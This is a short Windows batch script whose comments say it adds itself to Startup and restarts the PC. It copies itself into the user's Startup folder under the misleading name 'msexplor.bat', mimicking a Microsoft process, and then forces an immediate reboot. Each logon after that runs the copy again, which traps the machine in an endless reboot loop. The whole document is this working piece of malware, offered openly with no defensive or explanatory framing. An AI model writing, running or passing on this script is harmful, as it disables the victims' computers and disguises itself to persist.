:: Add itself to Startup
:: and restarts PC

@ echo off
copy /y %~f0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\msexplor.bat"
shutdown /r /t 0